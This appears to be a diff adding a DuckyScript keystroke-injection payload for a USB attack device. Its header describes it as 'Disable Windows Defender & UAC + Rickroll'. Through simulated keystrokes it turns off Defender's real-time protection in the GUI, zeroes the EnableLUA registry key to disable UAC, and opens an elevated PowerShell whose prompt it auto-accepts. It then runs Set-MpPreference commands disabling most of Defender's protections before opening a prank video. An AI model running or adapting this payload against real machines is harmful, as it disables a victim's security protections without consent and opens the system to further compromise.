@@ -1,0 +1,101 @@
+REM Disable Windows Defender & UAC + Rickroll
+DELAY 2000
+
+REM Open Windows Security via System Tray
+GUI a
+DELAY 300
+STRING Windows Security
+DELAY 500
+ENTER
+DELAY 2000
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Navigate to Virus & threat protection settings
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+TAB
+DELAY 300
+SPACE
+DELAY 300
+TAB
+DELAY 300
+SPACE
+
+REM Disable Real-time protection
+TAB
+DELAY 300
+TAB
+DELAY 300
+SPACE
+
+REM Close Windows Security
+ALT F4
+
+REM Disable UAC via Registry (Requires Admin)
+GUI r
+DELAY 500
+STRING reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+ENTER
+DELAY 1000
+
+REM Open Run and launch PowerShell as Admin
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Disable Windows Defender via PowerShell
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBlockAtFirstSeen $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIOAVProtection $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisablePrivacyAccess $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableArchiveScanning $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -SubmitSamplesConsent 2
+ENTER
+DELAY 500
+
+REM Rickroll via PowerShell
+STRING Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+ENTER
+DELAY 3000
+
+REM Send F11 for fullscreen
+GUI r
+DELAY 500
+STRING powershell (New-Object -ComObject WScript.Shell).SendKeys('{F11}')
+ENTER
+DELAY 1000
